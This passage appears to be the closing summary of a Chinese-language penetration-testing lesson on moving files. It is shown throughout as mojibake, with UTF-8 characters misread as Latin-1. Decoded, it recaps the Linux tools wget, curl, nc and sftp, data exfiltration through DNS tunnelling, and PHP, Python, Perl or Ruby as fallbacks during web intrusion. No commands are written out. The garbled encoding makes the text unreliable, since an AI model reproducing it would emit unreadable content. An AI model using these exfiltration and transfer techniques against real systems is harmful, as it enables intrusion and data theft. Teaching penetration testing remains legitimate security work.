*   åœ¨ **Linux** ä¸‹ï¼Œæˆ‘ä»¬å­¦ä¹ äº† `wget`ã€`curl`ã€`nc`ã€`sftp` ç­‰æ ‡å‡†å‘½ä»¤ï¼Œè¿˜äº†è§£äº†ä¸€ä¸ªé€šè¿‡ **DNSéš§é“å¤–å¸¦æ•°æ®** çš„ç‰¹æ®ŠæŠ€å·§ã€‚
*   æœ€åï¼Œæˆ‘ä»¬æ¢è®¨äº†å½“ç³»ç»Ÿå‘½ä»¤ä¸å¯ç”¨æ—¶ï¼Œå¦‚ä½•åˆ©ç”¨ **è„šæœ¬è¯­è¨€ç¯å¢ƒ**ï¼ˆå¦‚PHPã€Pythonã€Perlã€Rubyï¼‰æ¥å®ç°æ–‡ä»¶ä¼ è¾“ï¼Œè¿™æ˜¯åœ¨Webæ¸—é€ä¸­å¸¸è§çš„å¤‡ç”¨æ‰‹æ®µã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_230.png)

æŒæ¡è¿™äº›æ–¹æ³•èƒ½å¸®åŠ©æˆ‘ä»¬åœ¨å„ç§å—é™ç¯å¢ƒä¸‹ï¼Œæ›´æœ‰æ•ˆåœ°è¿›è¡Œæ–‡ä»¶æ“ä½œå’Œåç»­æ¸—é€æµ‹è¯•å·¥ä½œã€‚è¯·å¤§å®¶åŠ¡å¿…åœ¨è¯¾ååŠ¨æ‰‹å®è·µï¼ŒåŠ æ·±ç†è§£ã€‚